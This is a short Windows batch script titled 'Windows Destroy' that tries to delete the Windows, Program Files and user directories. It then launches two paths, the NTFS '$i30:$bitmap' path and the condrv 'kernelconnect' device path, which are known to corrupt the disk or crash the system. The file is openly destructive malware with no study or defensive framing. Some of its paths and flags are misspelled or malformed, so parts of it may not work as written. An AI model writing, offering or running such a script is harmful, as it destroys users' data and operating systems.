@ECHO OFF
TITLE Windows Destroy
DEL C:\Windows /y
DEL C:\Progam Files /y
DEL C:\Progam Files (x86) /y
DEL C:\User /y
START C:\:$i30:$bitmap 
START \\\\.\\globalroot\\device\\condrv\\kernelconnect 
